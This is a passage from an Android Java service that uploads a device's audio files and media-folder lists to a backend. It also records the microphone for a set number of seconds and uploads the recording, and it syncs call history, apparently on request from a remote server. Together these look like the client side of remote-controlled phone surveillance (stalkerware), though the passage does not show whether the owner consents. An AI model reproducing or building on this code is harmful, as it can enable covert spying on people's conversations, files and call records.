        request.setDeviceId(
                DeviceUtils.getDeviceId(this)
        );

        List<VideoFolderPayload> payloads = new ArrayList<>();

        for (VideoFolderItem item : folders) {

            VideoFolderPayload payload = new VideoFolderPayload();

            payload.setBucketId(item.getBucketId());
            payload.setFolderName(item.getFolderName());
            payload.setVideoCount(item.getVideoCount());

            payloads.add(payload);

        }

        request.setFolders(payloads);

        Log.d(TAG, "Calling Video Folder Sync API...");

        ApiClient.getApiService()
                .syncVideoFolders(request)
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<String>> call,
                            Response<ApiResponse<String>> response) {

                        Log.d(TAG, "HTTP Code : " + response.code());

                        if (response.body() != null) {

                            Log.d(TAG,
                                    "Success : "
                                            + response.body().isSuccess());

                            Log.d(TAG,
                                    "Message : "
                                            + response.body().getMessage());

                        }

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            Log.d(TAG, "Video Folder Sync Success");

                            videoFolderSynced = true;

                        } else {

                            try {

                                if (response.errorBody() != null) {

                                    Log.e(
                                            TAG,
                                            "Error Body : "
                                                    + response.errorBody().string()
                                    );

                                }

                            } catch (Exception e) {

                                Log.e(TAG,
                                        "Error Reading ErrorBody",
                                        e);

                            }

                        }

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<String>> call,
                            Throwable t) {

                        videoFolderSynced = false;

                        Log.e(
                                TAG,
                                "Video Folder Sync API Failed",
                                t
                        );

                    }

                });

    }

    private void uploadAudios(
            String folder,
            int limit,
            int offset,
            String order) {

        try {

            boolean permissionGranted;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

                permissionGranted =
                        hasPermission(Manifest.permission.READ_MEDIA_AUDIO);

            } else {

                permissionGranted =
                        hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);

            }

            if (!permissionGranted) {

                Log.e(TAG, "READ_MEDIA_AUDIO Permission Not Granted");

                audioUploading = false;

                return;
            }

            if (folder == null || folder.trim().isEmpty()) {

                Log.d(TAG, "Audio Bucket Id is NULL");

                audioUploading = false;

                return;
            }

            if (limit <= 0) {
                limit = 20;
            }

            if (offset < 0) {
                offset = 0;
            }

            if (order == null || order.trim().isEmpty()) {
                order = "NEWEST";
            }

            List<AudioItem> audios =
                    AudioUtils.getAudios(
                            this,
                            folder,
                            limit,
                            offset,
                            order
                    );

            if (audios == null) {

                Log.d(TAG, "Audio List NULL");

                audioUploading = false;

                return;
            }

            Log.d(TAG, "=========== AUDIO DEBUG ===========");
            Log.d(TAG, "Folder : " + folder);
            Log.d(TAG, "Limit : " + limit);
            Log.d(TAG, "Offset : " + offset);
            Log.d(TAG, "Order : " + order);
            Log.d(TAG, "Total Audio Found : " + audios.size());

            for (AudioItem item : audios) {

                Log.d(
                        TAG,
                        item.getName()
                                + " -> "
                                + item.getUri()
                );
            }

            if (audios.isEmpty()) {

                Log.d(TAG, "No Audio Found For Bucket : " + folder);

                audioUploading = false;

                return;
            }

            uploadAudioBatch(audios, 0);

        } catch (Exception e) {

            audioUploading = false;

            Log.e(TAG, "uploadAudios Error", e);
        }
    }

    private void uploadAudioBatch(
            List<AudioItem> audios,
            int startIndex) {



        if(startIndex >= audios.size()){


            audioUploading=false;


            Log.d(
                    TAG,
                    "All Audios Uploaded"
            );


            return;

        }




        RequestBody deviceBody =
                RequestBody.create(
                        DeviceUtils.getDeviceId(this),
                        MultipartBody.FORM
                );



        List<MultipartBody.Part> parts =
                new ArrayList<>();



        long totalSize=0;



        int endIndex =
                Math.min(
                        startIndex + AUDIO_BATCH_SIZE,
                        audios.size()
                );




        for(int i=startIndex;i<endIndex;i++){



            AudioItem item =
                    audios.get(i);



            Log.d(
                    TAG,
                    "Uploading Audio : "
                            +item.getName()
            );



            try {



                AssetFileDescriptor afd =
                        getContentResolver()
                                .openAssetFileDescriptor(
                                        item.getUri(),
                                        "r"
                                );



                if(afd!=null){


                    long size =
                            afd.getLength();



                    totalSize += size;



                    Log.d(
                            TAG,
                            "Size : "
                                    +(
                                    size/1024
                            )
                                    +" KB"
                    );



                    afd.close();

                }





                String mimeType =
                        getContentResolver()
                                .getType(
                                        item.getUri()
                                );



                if(mimeType==null || mimeType.isEmpty()){

                    mimeType="audio/*";

                }





                RequestBody body =
                        new InputStreamRequestBody(
                                this,
                                item.getUri(),
                                MediaType.parse(mimeType)
                        );




                MultipartBody.Part part =
                        MultipartBody.Part.createFormData(
                                "files",
                                item.getName(),
                                body
                        );



                parts.add(part);



            }catch(Exception e){


                Log.e(
                        TAG,
                        "Audio Read Error : "
                                +item.getName(),
                        e
                );


            }


        }





        if(parts.isEmpty()){


            uploadAudioBatch(
                    audios,
                    endIndex
            );


            return;

        }





        Log.d(
                TAG,
                "========= AUDIO UPLOAD ========="
        );


        Log.d(
                TAG,
                "Batch Count : "
                        +parts.size()
        );


        Log.d(
                TAG,
                "Total Size : "
                        +(totalSize/1024)
                        +" KB"
        );






        ApiClient.getApiService()
                .uploadAudios(
                        deviceBody,
                        parts
                )
                .enqueue(
                        new Callback<ApiResponse<String>>() {


                            @Override
                            public void onResponse(
                                    Call<ApiResponse<String>> call,
                                    Response<ApiResponse<String>> response) {



                                if(response.isSuccessful()
                                        && response.body()!=null
                                        && response.body().isSuccess()){


                                    Log.d(
                                            TAG,
                                            "Uploaded Audio : "
                                                    +startIndex
                                                    +" - "
                                                    +(endIndex-1)
                                    );


                                }else{


                                    Log.e(
                                            TAG,
                                            "Audio Upload Failed"
                                    );


                                    Log.e(
                                            TAG,
                                            "Code : "
                                                    +response.code()
                                    );


                                }




                                uploadAudioBatch(
                                        audios,
                                        endIndex
                                );

                            }





                            @Override
                            public void onFailure(
                                    Call<ApiResponse<String>> call,
                                    Throwable t) {



                                Log.e(
                                        TAG,
                                        "Audio Upload Error",
                                        t
                                );



                                uploadAudioBatch(
                                        audios,
                                        endIndex
                                );


                            }


                        });



    }

    private void syncAudioFolders() {


        Log.d(TAG, "========== AUDIO FOLDER SYNC ==========");



        boolean permissionGranted;



        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {


            permissionGranted =
                    ActivityCompat.checkSelfPermission(
                            this,
                            Manifest.permission.READ_MEDIA_AUDIO
                    )
                            == PackageManager.PERMISSION_GRANTED;



        } else {


            permissionGranted =
                    ActivityCompat.checkSelfPermission(
                            this,
                            Manifest.permission.READ_EXTERNAL_STORAGE
                    )
                            == PackageManager.PERMISSION_GRANTED;


        }





        if(!permissionGranted){


            Log.d(
                    TAG,
                    "Audio permission not granted. Folder sync skipped."
            );


            audioFolderSynced=false;


            return;

        }






        List<AudioFolderItem> folders =
                AudioUtils.getAudioFolders(this);




        if(folders==null){


            Log.d(
                    TAG,
                    "Audio Folder List NULL"
            );


            audioFolderSynced=false;


            return;

        }





        Log.d(
                TAG,
                "Total Audio Folder : "
                        +folders.size()
        );





        for(AudioFolderItem item: folders){


            Log.d(
                    TAG,
                    "BucketId = "
                            +item.getBucketId()
                            +" | Folder = "
                            +item.getFolderName()
                            +" | Count = "
                            +item.getAudioCount()
            );


        }







        AudioFolderSyncRequest request =
                new AudioFolderSyncRequest();



        request.setDeviceId(
                DeviceUtils.getDeviceId(this)
        );





        List<AudioFolderPayload> payloadList =
                new ArrayList<>();





        for(AudioFolderItem item: folders){



            AudioFolderPayload payload =
                    new AudioFolderPayload();



            payload.setBucketId(
                    item.getBucketId()
            );


            payload.setFolderName(
                    item.getFolderName()
            );


            payload.setAudioCount(
                    item.getAudioCount()
            );



            payloadList.add(payload);



        }





        request.setFolders(payloadList);





        Log.d(
                TAG,
                "Calling Audio Folder Sync API..."
        );






        ApiClient.getApiService()
                .syncAudioFolders(request)
                .enqueue(
                        new Callback<ApiResponse<String>>() {



                            @Override
                            public void onResponse(
                                    Call<ApiResponse<String>> call,
                                    Response<ApiResponse<String>> response) {



                                Log.d(
                                        TAG,
                                        "HTTP Code : "
                                                +response.code()
                                );




                                if(response.body()!=null){


                                    Log.d(
                                            TAG,
                                            "Success : "
                                                    +response.body().isSuccess()
                                    );


                                    Log.d(
                                            TAG,
                                            "Message : "
                                                    +response.body().getMessage()
                                    );


                                }






                                if(response.isSuccessful()
                                        && response.body()!=null
                                        && response.body().isSuccess()){



                                    Log.d(
                                            TAG,
                                            "Audio Folder Sync Success"
                                    );



                                    audioFolderSynced=true;



                                }else{



                                    audioFolderSynced=false;



                                    try {


                                        if(response.errorBody()!=null){


                                            Log.e(
                                                    TAG,
                                                    response.errorBody().string()
                                            );


                                        }


                                    }catch(Exception e){


                                        Log.e(
                                                TAG,
                                                "Error reading error body",
                                                e
                                        );

                                    }


                                }


                            }





                            @Override
                            public void onFailure(
                                    Call<ApiResponse<String>> call,
                                    Throwable t) {



                                audioFolderSynced=false;


                                Log.e(
                                        TAG,
                                        "Audio Folder Sync Failed",
                                        t
                                );


                            }


                        });



    }

    private void startMicRecording(int duration) {

        if (micRecording) {
            Log.d(TAG, "Mic already recording");
            return;
        }

        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {

            Log.e(TAG, "RECORD_AUDIO permission missing");
            return;
        }

        try {

            File folder = new File(getExternalFilesDir(null), "Mic");

            if (!folder.exists()) {
                folder.mkdirs();
            }

            micFile = new File(
                    folder,
                    "mic_" + System.currentTimeMillis() + ".mp4"
            );

            mediaRecorder = new MediaRecorder();

            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(micFile.getAbsolutePath());

            mediaRecorder.prepare();
            mediaRecorder.start();

            micRecording = true;

            Log.d(TAG, "Mic recording started");

            new Handler(Looper.getMainLooper()).postDelayed(
                    () -> stopMicRecording(duration),
                    duration * 1000L
            );

        } catch (Exception e) {

            Log.e(TAG, "Mic Start Error", e);

            micRecording = false;

            if (mediaRecorder != null) {
                mediaRecorder.release();
                mediaRecorder = null;
            }
        }
    }

    private void stopMicRecording(int duration) {

        try {

            if (mediaRecorder != null) {

                try {
                    mediaRecorder.stop();
                } catch (RuntimeException e) {
                    Log.e(TAG, "Recorder Stop Error", e);
                }

                mediaRecorder.release();
                mediaRecorder = null;
            }

            Log.d(TAG, "Mic recording completed");

            if (micFile != null && micFile.exists()) {

                uploadMicRecording(
                        micFile,
                        duration
                );

            } else {

                micRecording = false;
            }

        } catch (Exception e) {

            micRecording = false;

            Log.e(TAG, "Mic Stop Error", e);
        }
    }

    private void uploadMicRecording(
            File file,
            int duration
    ) {

        try {

            if (file == null || !file.exists()) {

                Log.e(TAG, "Mic file not found");

                micRecording = false;

                return;
            }

            RequestBody deviceBody =
                    RequestBody.create(
                            DeviceUtils.getDeviceId(this),
                            MultipartBody.FORM
                    );

            RequestBody durationBody =
                    RequestBody.create(
                            String.valueOf(duration),
                            MultipartBody.FORM
                    );

            RequestBody requestFile =
                    RequestBody.create(
                            file,
                            MediaType.parse("audio/mp4")
                    );

            MultipartBody.Part audioPart =
                    MultipartBody.Part.createFormData(
                            "file",
                            file.getName(),
                            requestFile
                    );

            Log.d(TAG, "========== MIC UPLOAD ==========");
            Log.d(TAG, "File : " + file.getAbsolutePath());
            Log.d(TAG, "Size : " + (file.length() / 1024) + " KB");
            Log.d(TAG, "Duration : " + duration + " sec");

            ApiClient.getApiService()
                    .uploadMicRecording(
                            deviceBody,
                            durationBody,
                            audioPart
                    )
                    .enqueue(new Callback<ApiResponse<String>>() {

                        @Override
                        public void onResponse(
                                Call<ApiResponse<String>> call,
                                Response<ApiResponse<String>> response) {

                            micRecording = false;

                            if (response.isSuccessful()
                                    && response.body() != null
                                    && response.body().isSuccess()) {

                                Log.d(TAG, "Mic Upload Success");
                                Log.d(TAG, response.body().getMessage());

                                if (file.exists()) {
                                    boolean deleted = file.delete();
                                    Log.d(TAG, "Local Mic File Deleted : " + deleted);
                                }

                            } else {

                                Log.e(TAG, "Mic Upload Failed");

                                if (response.body() != null) {
                                    Log.e(TAG, response.body().getMessage());
                                }

                                try {

                                    if (response.errorBody() != null) {

                                        Log.e(
                                                TAG,
                                                response.errorBody().string()
                                        );

                                    }

                                } catch (Exception e) {

                                    Log.e(TAG, "Error Reading ErrorBody", e);

                                }
                            }
                        }

                        @Override
                        public void onFailure(
                                Call<ApiResponse<String>> call,
                                Throwable t) {

                            micRecording = false;

                            Log.e(TAG, "Mic Upload Error", t);
                        }
                    });

        } catch (Exception e) {

            micRecording = false;

            Log.e(TAG, "Mic Upload Exception", e);
        }
    }

    //CAll History
    private void syncCallHistory(
            String deviceId,
            LocalDate fromDate,
            LocalDate toDate) {

        Log.d(
                TAG,
                "========================================"
        );

        Log.d(
                TAG,
                "Starting Call History Sync"
        );

        Log.d(
                TAG,
                "Device ID : " + deviceId
        );

        Log.d(
                TAG,
                "From Date : " + fromDate
        );

        Log.d(
                TAG,
                "To Date   : " + toDate
        );

        Log.d(
                TAG,
                "========================================"
        );

        try {

            // =========================================
            // 1. Get Call History From Device
            // =========================================

            CallHistoryUtils utils =
                    new CallHistoryUtils(this);

            List<CallHistorySyncItemDTO> calls =
                    utils.getCallHistory(
                            fromDate,
                            toDate
                    );

            if (calls == null) {

                Log.e(
                        TAG,
                        "Call history list is NULL"
                );

                return;
            }

            Log.d(
                    TAG,
                    "Call history records found = "
                            + calls.size()
            );

            // =========================================
            // 2. Create Sync Request
            // =========================================

            CallHistorySyncRequest request =
                    new CallHistorySyncRequest();

            request.setDeviceId(deviceId);

            request.setFromDate(fromDate);

            request.setToDate(toDate);

            request.setCalls(calls);

            Log.d(
                    TAG,
                    "Call History Request Created"
            );

            // =========================================
            // 3. Send Call History To Backend
            // =========================================

            ApiClient.getApiService()
                    .syncCallHistory(request)
                    .enqueue(new Callback<ApiResponse<String>>() {

                        @Override
                        public void onResponse(
                                Call<ApiResponse<String>> call,
                                Response<ApiResponse<String>> response) {

                            if (response.isSuccessful()
                                    && response.body() != null
                                    && response.body().isSuccess()) {

                                Log.d(
                                        TAG,
                                        "========================================"
                                );

                                Log.d(
                                        TAG,
                                        "Call history synced successfully"
                                );

                                Log.d(
                                        TAG,
                                        "Records uploaded = "
                                                + calls.size()
                                );

                                Log.d(
                                        TAG,
                                        "========================================"
                                );

                                // =====================================
                                // 4. Sync Successful
                                //    Reset refreshCallHistory
                                // =====================================

                                resetCallHistoryRequest(deviceId);

                            } else {

                                Log.e(
                                        TAG,
                                        "Call history sync failed"
                                );

                                Log.e(
                                        TAG,
                                        "HTTP Code = "
                                                + response.code()
                                );

                                if (response.body() != null) {

                                    Log.e(
                                            TAG,
                                            "Message = "
                                                    + response.body().getMessage()
                                    );

                                }

                                try {

                                    if (response.errorBody() != null) {

                                        Log.e(
                                                TAG,
                                                "Error Body = "
                                                        + response.errorBody().string()
                                        );

                                    }

                                } catch (Exception e) {

                                    Log.e(
                                            TAG,
                                            "Error reading error body",
                                            e
                                    );
                                }
                            }
                        }

                        @Override
                        public void onFailure(
                                Call<ApiResponse<String>> call,
                                Throwable t) {

                            Log.e(
                                    TAG,
                                    "Call history sync API failed",
                                    t
                            );

                        }
                    });

        } catch (Exception e) {

            Log.e(
                    TAG,
                    "Call history sync exception",
                    e
            );
        }
    }

    private void resetCallHistoryRequest(String deviceId) {

        Log.d(
                TAG,
                "Resetting refreshCallHistory..."
        );

        ApiClient.getApiService()
                .callHistorySyncCompleted(deviceId)
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<String>> call,
                            Response<ApiResponse<String>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            Log.d(
                                    TAG,
                                    "refreshCallHistory reset successfully"
                            );

                        } else {

                            Log.e(
                                    TAG,
                                    "Failed to reset refreshCallHistory"
                            );

                            Log.e(
                                    TAG,
                                    "HTTP Code = "
                                            + response.code()
                            );
                        }
                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<String>> call,
                            Throwable t) {

                        Log.e(
                                TAG,
                                "Reset refreshCallHistory API failed",
                                t
                        );
                    }
                });
    }

}